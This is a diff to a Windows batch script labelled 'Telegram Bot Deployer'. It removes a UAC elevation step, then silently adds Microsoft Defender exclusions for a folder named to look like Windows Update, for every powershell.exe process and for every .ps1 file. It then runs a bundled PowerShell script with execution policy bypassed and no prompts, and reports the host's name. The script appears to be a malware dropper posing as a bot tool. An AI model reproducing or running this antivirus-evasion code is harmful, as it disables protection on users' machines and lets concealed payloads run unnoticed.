@@ -2,15 +2,12 @@
 title Telegram Bot Deployer
 color 0A
 
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
-
 setlocal enabledelayedexpansion
 set "SCRIPT_DIR=%~dp0"
 
+:: ============================================================
+:: SELECT WHICH SCRIPT TO RUN
+:: ============================================================
 set "SELECTED=MA01.ps1"
 set "LABEL=Maraki Lab 1"
 
@@ -19,16 +16,15 @@ echo    TELEGRAM BOT DEPLOYER
 echo ========================================
 echo.
 
-powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue"
-
-echo [INFO] Defender exclusions added.
+:: Optional Defender exclusions (skip if not admin - won't error)
+powershell -NoProfile -Command "try { Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue } catch {}"
+echo [INFO] Defender exclusions added (if admin).
 echo.
 
 set "FOUND_SCRIPT=%SCRIPT_DIR%%SELECTED%"
 
 if not exist "%FOUND_SCRIPT%" (
     echo [ERROR] Script not found: %FOUND_SCRIPT%
-    pause
     exit /b 1
 )
 
@@ -36,21 +32,23 @@ echo [INFO] Selected: %LABEL% (%SELECTED%)
 echo [INFO] Deploying...
 echo.
 
+:: Run the script - no prompts, no pause, no bot
 powershell -NoProfile -ExecutionPolicy Bypass -File "%FOUND_SCRIPT%"
+set "RC=%errorlevel%"
 
-if %errorlevel% equ 0 (
+if %RC% equ 0 (
     echo.
     echo ========================================
-    powershell -Command "Write-Host '   DEPLOYMENT SUCCESSFUL!' -ForegroundColor Green"
+    echo    DEPLOYMENT SUCCESSFUL
     echo ========================================
-    echo.
-    echo [INFO] Deployed on host: %COMPUTERNAME%
+    echo [INFO] Host: %COMPUTERNAME%
     echo.
 ) else (
     echo.
     echo ========================================
-    powershell -Command "Write-Host '   DEPLOYMENT FAILED!' -ForegroundColor Red"
+    echo    DEPLOYMENT FAILED (exit %RC%)
     echo ========================================
+    echo.
 )
 
-exit /b 0
+exit /b %RC%
